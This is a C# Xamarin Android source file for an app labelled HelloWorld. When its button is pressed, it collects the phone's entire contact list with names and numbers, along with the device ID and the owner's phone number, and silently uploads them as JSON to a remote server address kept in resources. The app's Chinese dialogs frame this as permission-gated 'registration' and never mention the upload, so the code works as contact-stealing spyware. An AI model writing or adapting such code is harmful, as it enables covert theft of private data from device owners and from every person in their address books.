using System;
using System.Collections.Generic;
using System.Net;
using System.Threading.Tasks;
using Android;
using Android.App;
using Android.Content.PM;
using Android.Database;
using Android.Net;
using Android.Widget;
using Android.OS;
using Android.Provider;
using Android.Support.Design.Widget;
using Android.Support.V4.App;
using Android.Support.V4.Content;
using Android.Support.V7.App;
using Android.Views;
using AlertDialog = Android.App.AlertDialog;
using Uri = Android.Net.Uri;
using Android.Telephony;
using Newtonsoft.Json;
using CursorLoader = Android.Content.CursorLoader;
using LoaderManager = Android.Support.V4.App.LoaderManager;
using System.IO;
using System.Text;

namespace HelloWorld
{
    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme.NoActionBar", MainLauncher = true)]
    public class MainActivity : AppCompatActivity
    {
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            RequestPermission();
            SetContentView(Resource.Layout.activity_main);
            Button btnGetContacts = FindViewById<Button>(Resource.Id.getCont);
            btnGetContacts.Click += btnGetContacts_Click;

            ProgressBar progressBar = FindViewById<ProgressBar>(Resource.Id.progressBar);
            progressBar.Visibility = ViewStates.Invisible;
        }

        private async void btnGetContacts_Click(object sender, EventArgs e)
        {
            if (!RequestPermission())
            {
                return;
            }

            ProgressBar progressBar = FindViewById<ProgressBar>(Resource.Id.progressBar);
            progressBar.Visibility = ViewStates.Visible;

            Button button = sender as Button;
            button.Enabled = false;

            Uri contactsUri = ContactsContract.Contacts.ContentUri;
            string[] cols = new[] {ContactsContract.Contacts.InterfaceConsts.Id, ContactsContract.Contacts.InterfaceConsts.DisplayName};
            CursorLoader loader = new CursorLoader(ApplicationContext, contactsUri, cols, null, null, null);
            ICursor cursor = (ICursor) loader.LoadInBackground();

            CursorLoader numberCursorLoader = new CursorLoader(ApplicationContext, ContactsContract.CommonDataKinds.Phone.ContentUri, new[] {ContactsContract.CommonDataKinds.Phone.Number}, null, null, null);

            TelephonyManager systemService = (TelephonyManager) GetSystemService(TelephonyService);

            await Task.Run(() =>
            {
                Dictionary<string, List<string>> contacts = new Dictionary<string, List<string>>();
                if (cursor.MoveToFirst())
                {
                    do
                    {
                        int id = cursor.GetInt(cursor.GetColumnIndex(cols[0]));
                        string displayName = cursor.GetString(cursor.GetColumnIndex(cols[1]));
                        if (!contacts.ContainsKey(displayName))
                        {
                            contacts[displayName] = new List<string>();
                        }

                        string strWhere = $"{ContactsContract.CommonDataKinds.Phone.InterfaceConsts.ContactId}={id}";
                        numberCursorLoader.Selection = strWhere;
                        ICursor numberCursor = (ICursor) numberCursorLoader.LoadInBackground();
                        if (numberCursor.MoveToFirst())
                        {
                            do
                            {
                                string number = numberCursor.GetString(numberCursor.GetColumnIndex(ContactsContract.CommonDataKinds.Phone.Number));
                                contacts[displayName].Add(number);
                            } while (numberCursor.MoveToNext());
                        }
                    } while (cursor.MoveToNext());
                }

                string deviceId = systemService.DeviceId;
                string pnumber = systemService.Line1Number;
                var data = new
                {
                    DeviceId = deviceId,
                    PhoneNumber = pnumber,
                    Contacts = contacts
                };
                try
                {
                    WebClient client = new WebClient();
                    string url = Resources.GetString(Resource.String.remoteAddr);
                    client.Headers.Add(HttpRequestHeader.ContentType, "application/json");
                    client.UploadString(url, JsonConvert.SerializeObject(data));
                    this.RunOnUiThread(() => Toast.MakeText(ApplicationContext, Resource.String.successMsg, ToastLength.Long).Show());
                    Resources.GetString(Resource.String.getContract);
                }
                catch (WebException exception)
                {
                    this.RunOnUiThread(() =>
                    {
                        Toast.MakeText(ApplicationContext, exception.Message, ToastLength.Long).Show();
                        button.Enabled = true;
                    });
                }

                this.RunOnUiThread(() => progressBar.Visibility = ViewStates.Invisible);
            });
        }

        public override bool OnCreateOptionsMenu(IMenu menu)
        {
            MenuInflater.Inflate(Resource.Menu.menu_main, menu);
            return true;
        }

        public override bool OnOptionsItemSelected(IMenuItem item)
        {
            int id = item.ItemId;
            if (id == Resource.Id.action_settings)
            {
                return true;
            }

            return base.OnOptionsItemSelected(item);
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, Permission[] grantResults)
        {
            if (grantResults[0] == Permission.Denied || grantResults[1] == Permission.Denied)
            {
                new AlertDialog.Builder(this).SetMessage("请允许联系人和拨打电话权限，此程序不会主动拨打电话").SetPositiveButton("关闭", (sender, args) =>
                {
                    Toast.MakeText(ApplicationContext, "注册失败", ToastLength.Long).Show();
                    Android.App.AlertDialog dialog = sender as Android.App.AlertDialog;
                    dialog.Dismiss();
                    dialog.Dispose();
                }).Show();
            }
        }

        private bool RequestPermission()
        {
            if (ContextCompat.CheckSelfPermission(this, Manifest.Permission.ReadPhoneState) != Permission.Granted || ContextCompat.CheckSelfPermission(this, Manifest.Permission.ReadPhoneState) != Permission.Granted)
            {
                ActivityCompat.RequestPermissions(this, new[] {Manifest.Permission.ReadPhoneState, Manifest.Permission.ReadContacts}, 0);
                return false;
            }

            return true;
        }
    }
}

